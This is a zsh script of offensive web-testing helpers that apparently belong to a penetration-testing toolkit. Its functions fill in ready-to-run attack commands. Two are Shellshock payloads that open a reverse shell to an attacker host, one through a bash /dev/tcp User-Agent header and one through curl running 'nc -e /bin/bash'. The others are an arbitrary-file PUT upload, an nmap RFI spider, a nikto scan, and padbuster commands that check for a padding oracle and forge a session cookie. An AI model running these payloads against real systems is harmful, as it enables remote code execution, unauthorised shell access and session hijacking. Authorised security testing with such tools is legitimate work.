#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-vuln
#############################################################

qq-enum-web-vuln-nikto() {
  local u && read "u?URL: "
  local d=$(echo "${u}" | cut -d/ -f3)
  print -z "nikto -C all -useragent \"${__UA}\" -h ${u} -output nikto.${d}.log"
}

qq-enum-web-vuln-nmap-rfi() {
  local r && read "r?RHOST: "
  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' -oN web.rfi.nmap ${r}"
}

qq-enum-web-vuln-shellshock-cookie() {
  local l && read "l?LHOST: "
  local p && read "port?LPORT: "
  print -z "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${l}/${p} 0>&1"
}

qq-enum-web-vuln-shellshock-nc() {
  local l && read "l?LHOST: "
  local r && read "r?RHOST: "
  local p && read "port?LPORT: "
  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${l} ${p} -e /bin/bash\"' http://${r}/cgi-bin/status"
}

qq-enum-web-vuln-put-curl() {
  local r && read "r?RHOST: "
  local f=$(rlwrap -S 'FILE: ' -e '' -c -o cat)
  print -z "curl -T ${f} http://${r}/${f}"
}

qq-enum-web-vuln-padbuster-check() {
  local r && read "r?RHOST: "
  local cn && read "cn?COOKIE_NAME: "
  local cv && read "cv?COOKIE_VALUE: "
  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

qq-enum-web-vuln-padbuster-forge() {
  local r && read "r?RHOST: "
  local cn && read "cn?COOKIE_NAME: "
  local cv && read "cv?COOKIE_VALUE: "
  local u && read "u?USER: "
  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
}